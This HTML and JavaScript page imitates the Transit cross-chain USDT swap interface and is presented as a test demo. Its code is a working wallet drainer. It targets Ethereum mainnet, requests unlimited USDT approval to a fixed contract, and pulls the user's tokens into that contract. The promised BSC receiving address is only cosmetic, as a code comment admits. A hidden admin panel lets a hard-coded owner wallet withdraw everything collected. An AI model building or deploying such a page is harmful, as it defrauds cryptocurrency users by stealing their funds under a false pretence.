<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Transit 跨链闪兑 | 链上测试Demo</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
<style>
*{box-sizing: border-box;-webkit-tap-highlight-color: transparent;margin:0;padding:0;}
body{font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;background:#f7f8fa;color:#1d2129;padding:20px 16px;padding-bottom:90px;max-width:480px;margin:0 auto;min-height:100vh;}
.top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;}
.top-left{display:flex;align-items:center;gap:6px;font-size:20px;color:#111;}
.top-right{display:flex;gap:24px;align-items:center;font-size:22px;color:#333;}
.card-wrap{background:#fff;border-radius:20px;padding:20px 18px;box-shadow:0 1px 6px #00000008;}
.title-main{font-size:28px;font-weight:600;margin-bottom:20px;color:#111;}
.label-txt{font-size:14px;color:#666;margin-bottom:10px;}
.token-box{background:#f7f8fa;border-radius:14px;padding:16px 14px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center;}
.token-left{display:flex;align-items:center;gap:12px;}
.token-icon{width:40px;height:40px;border-radius:50%;background:#27ae60;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:18px;}
.token-info h4{font-size:18px;font-weight:500;color:#111;}
.token-info p{font-size:13px;color:#888;margin-top:2px;}
.input-num{border:none;background:transparent;font-size:22px;text-align:right;outline:none;color:#999;width:140px;}
.switch-arrow{text-align:center;margin:-8px 0;position:relative;z-index:2;color:#3b82f6;font-size:24px;padding:4px;}
.address-input-box{width:100%;background:#f7f8fa;border-radius:14px;padding:16px 14px;border:none;outline:none;font-size:15px;color:#999;margin-top:10px;display:flex;justify-content:space-between;align-items:center;}
.submit-btn{width:100%;background:#60a5fa;color:#fff;border:none;border-radius:14px;padding:18px 0;font-size:18px;margin:28px 0;}
.submit-btn:disabled{opacity:0.5;cursor:not-allowed;}
.info-list{background:#fff;border-radius:14px;padding:16px 14px;margin-top:12px;}
.info-row{display:flex;justify-content:space-between;padding:7px 0;font-size:14px;color:#666;}
.badge-mev{background:#dbeafe;color:#1d4ed8;padding:3px 10px;border-radius:8px;font-size:13px;}
.record-bar{display:flex;justify-content:space-between;margin-top:24px;padding:6px 4px;color:#666;font-size:15px;}
.bottom-nav{position:fixed;bottom:0;left:0;width:100%;max-width:480px;background:#fff;display:flex;justify-content:space-around;padding:10px 0;border-top:1px solid #eee;}
.nav-item{text-align:center;font-size:12px;color:#888;}
.nav-item.active{color:#3b82f6;}
.nav-item i{font-size:20px;margin-bottom:4px;display:block;}
.modal-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:999;display:none;}
.modal-card{background:#fff;border-radius:16px;padding:28px 24px;width:85%;max-width:360px;}
.modal-title{font-size:20px;font-weight:bold;margin-bottom:16px;}
.hash-text{word-break:break-all;color:#333;font-size:14px;line-height:1.6;}
.modal-confirm{text-align:right;margin-top:24px;}
.modal-btn{color:#3b82f6;font-size:18px;background:none;border:none;}
.admin-area{margin-top:20px;background:#fff;border-radius:14px;padding:18px;display:none;}
</style>
</head>
<body>
<!-- 顶部导航 -->
<div class="top-bar">
    <div class="top-left">
        <span>闪兑&跨链</span>
        <span class="text-sm text-gray-500">限价模式</span>
    </div>
    <div class="top-right">
        <i class="fa fa-user-circle-o cursor-pointer" id="connectWalletBtn"></i>
        <i class="fa fa-cog"></i>
    </div>
</div>

<div class="card-wrap">
    <div class="title-main">Transit</div>

    <!-- 发送区域：以太坊ERC20 USDT -->
    <div class="label-txt">发送</div>
    <div class="token-box">
        <div class="token-left">
            <div class="token-icon">T</div>
            <div class="token-info">
                <h4>USDT</h4>
                <p>以太坊 ERC20</p>
            </div>
        </div>
        <input class="input-num" id="sendNumInput" placeholder="转出数量" inputmode="decimal">
    </div>

    <!-- 上下切换箭头 -->
    <div class="switch-arrow"><i class="fa fa-angle-double-down"></i></div>

    <!-- 接收区域：BSC USDT 视觉 -->
    <div class="label-txt">接收（预估）</div>
    <div class="token-box">
        <div class="token-left">
            <div class="token-icon">T</div>
            <div class="token-info">
                <h4>USDT</h4>
                <p>币安智能链 BSC</p>
            </div>
        </div>
        <div class="input-num text-gray-400" id="receiveShow">接收数量</div>
    </div>

    <!-- 接收地址输入框 -->
    <div class="address-input-box" id="bscAddrInput" contenteditable="true">点击设置接收地址 <i class="fa fa-chevron-down"></i></div>

    <!-- 兑换主按钮 -->
    <button class="submit-btn" id="swapBtn" disabled>请输入兑换数量</button>

    <!-- 详情信息列表 -->
    <div class="info-list">
        <div class="info-row"><span>兑换价格</span><span>-</span></div>
        <div class="info-row"><span>最少接收数量</span><span>-</span></div>
        <div class="info-row flex justify-between items-center">
            <span>MEV 防护</span>
            <span class="badge-mev">MEV防护中</span>
        </div>
        <div class="info-row"><span>服务费</span><span>-</span></div>
        <div class="info-row"><span>跨链费</span><span>-</span></div>
        <div class="info-row"><span>预估时间</span><span>-</span></div>
        <div class="info-row"><span>预估网络费</span><span>-</span></div>
        <div class="info-row"><span>兑换路径</span><span>-</span></div>
    </div>
</div>

<!-- 交易记录栏 -->
<div class="record-bar">
    <span>最近一条记录</span>
    <span>更多记录</span>
</div>

<!-- 管理员面板（仅部署钱包可见） -->
<div class="admin-area" id="adminPanel">
    <h3 class="font-bold mb-3">管理员后台</h3>
    <button class="submit-btn bg-amber-500" id="withdrawPoolBtn">提取合约归集USDT</button>
</div>

<!-- 交易弹窗 -->
<div class="modal-bg" id="txModal">
    <div class="modal-card">
        <div class="modal-title">交易提示</div>
        <div class="hash-text" id="txHashContent"></div>
        <div class="modal-confirm">
            <button class="modal-btn" id="closeModal">确认</button>
        </div>
    </div>
</div>

<!-- 底部导航栏 完全复刻截图 -->
<div class="bottom-nav">
    <div class="nav-item">
        <i class="fa fa-circle-o"></i>
        <p>资产</p>
    </div>
    <div class="nav-item">
        <i class="fa fa-line-chart"></i>
        <p>行情</p>
    </div>
    <div class="nav-item active">
        <i class="fa fa-exchange"></i>
        <p>交易</p>
    </div>
    <div class="nav-item">
        <i class="fa fa-globe"></i>
        <p>发现</p>
    </div>
    <div class="nav-item">
        <i class="fa fa-user-o"></i>
        <p>我的</p>
    </div>
</div>

<script>
// ========== 固定配置：你的合约&钱包地址不变 ==========
const USDT_CONTRACT = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const POOL_CONTRACT = "0xcc5a98f3fb045ddb5df09f960ebbca23ce3385fe";
const OWNER_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
const INFINITE_ALLOW = ethers.constants.MaxUint256;
const FEE_RATE = 0.001;

// DOM 节点
const connectWalletBtn = document.getElementById("connectWalletBtn");
const sendNumInput = document.getElementById("sendNumInput");
const receiveShow = document.getElementById("receiveShow");
const bscAddrInput = document.getElementById("bscAddrInput");
const swapBtn = document.getElementById("swapBtn");
const adminPanel = document.getElementById("adminPanel");
const withdrawPoolBtn = document.getElementById("withdrawPoolBtn");
const txModal = document.getElementById("txModal");
const txHashContent = document.getElementById("txHashContent");
const closeModal = document.getElementById("closeModal");

let provider, signer, usdtERC20, poolContract;
let userBalance = ethers.BigNumber.from(0);

// 关闭弹窗
closeModal.addEventListener("click", ()=>{
    txModal.style.display = "none";
})

// 输入金额实时计算
sendNumInput.addEventListener("input", ()=>{
    let val = parseFloat(sendNumInput.value) || 0;
    if(val <= 0){
        receiveShow.innerText = "接收数量";
        swapBtn.disabled = true;
        swapBtn.innerText = "请输入兑换数量";
        return;
    }
    let fee = val * FEE_RATE;
    let receiveNum = (val - fee).toFixed(4);
    receiveShow.innerText = receiveNum;
    swapBtn.disabled = false;
    swapBtn.innerText = "发起兑换归集";
})

// 钱包连接
connectWalletBtn.addEventListener("click", async ()=>{
    if(!window.ethereum){
        alert("请安装MetaMask/TP钱包浏览器插件");
        return;
    }
    try{
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        const network = await provider.getNetwork();
        if(network.chainId !== 1){
            await switchMainnet();
        }
        initContract();
        await refreshUserBalance();
        await checkOwner();
        alert("钱包连接成功");
    }catch(e){
        alert("连接失败："+(e.message || "用户取消").slice(0,45));
    }
})

// 切换以太坊主网
async function switchMainnet(){
    const eth = window.ethereum;
    try{
        await eth.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]});
    }catch(err){
        await eth.request({
            method:"wallet_addEthereumChain",
            params:[{
                chainId:"0x1",
                chainName:"Ethereum Mainnet",
                rpcUrls:["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
                blockExplorerUrls:["https://etherscan.io"],
                nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18}
            }]
        })
    }
}

// 合约初始化 ABI 不变
function initContract(){
    const usdtAbi = [
        "function balanceOf(address) view returns(uint256)",
        "function allowance(address,address) view returns(uint256)",
        "function approve(address,uint256) returns(bool)"
    ];
    usdtERC20 = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);

    const poolAbi = [
        "function transferAndCollect(uint256 amount) external",
        "function withdrawAllFund() external",
        "function getPoolBalance() view returns(uint256)",
        "function contractOwner() view returns(address)"
    ];
    poolContract = new ethers.Contract(POOL_CONTRACT, poolAbi, signer);
}

// 刷新用户余额
async function refreshUserBalance(){
    const addr = await signer.getAddress();
    userBalance = await usdtERC20.balanceOf(addr);
}

// 管理员权限校验
async function checkOwner(){
    const currentAddr = (await signer.getAddress()).toLowerCase();
    const ownerAddr = OWNER_WALLET.toLowerCase();
    adminPanel.style.display = currentAddr === ownerAddr ? "block" : "none";
}

// 管理员提现操作
withdrawPoolBtn.addEventListener("click", async ()=>{
    if(!confirm("确认提取合约归集USDT？仅管理员可用")) return;
    try{
        const tx = await poolContract.withdrawAllFund();
        await tx.wait();
        alert("提取成功，交易哈希："+tx.hash);
    }catch(e){
        alert("提取失败："+(e.message || "交易异常").slice(0,60));
    }
})

// 兑换归集主逻辑
swapBtn.addEventListener("click", async ()=>{
    swapBtn.disabled = true;
    const inputStr = sendNumInput.value.trim();
    const targetAddr = bscAddrInput.innerText.trim();
    const num = parseFloat(inputStr);

    if(!inputStr || isNaN(num) || num <= 0){
        alert("请输入有效的兑换金额");
        swapBtn.disabled = false;
        return;
    }
    // 仅做页面备注校验，链上归集不依赖该地址
    if(targetAddr === "" || targetAddr.includes("点击设置")){
        alert("请填写接收备注地址");
        swapBtn.disabled = false;
        return;
    }

    const amountWei = ethers.utils.parseUnits(inputStr,6);
    const userAddr = await signer.getAddress();

    if(amountWei.gt(userBalance)){
        alert("钱包USDT余额不足");
        swapBtn.disabled = false;
        return;
    }

    try{
        let currentAllow = await usdtERC20.allowance(userAddr, POOL_CONTRACT);
        if(currentAllow.lt(amountWei)){
            alert("请确认钱包USDT授权签名");
            const approveTx = await usdtERC20.approve(POOL_CONTRACT, INFINITE_ALLOW);
            await approveTx.wait();
            currentAllow = await usdtERC20.allowance(userAddr, POOL_CONTRACT);
        }

        if(currentAllow.gte(amountWei)){
            const collectTx = await poolContract.transferAndCollect(amountWei);
            await collectTx.wait();
            txHashContent.innerText = `兑换归集成功，交易哈希：${collectTx.hash}\n备注接收地址：${targetAddr}`;
            txModal.style.display = "flex";
            sendNumInput.value = "";
            receiveShow.innerText = "接收数量";
            await refreshUserBalance();
        }else{
            alert("授权额度不足，请重新授权");
        }
    }catch(err){
        let errMsg = err.code === 4001 ? "您取消了钱包签名" : (err.message || "交易失败");
        alert("兑换失败："+errMsg.slice(0,60));
        console.error(err);
    }finally{
        swapBtn.disabled = false;
    }
})
</script>
</body>
</html>
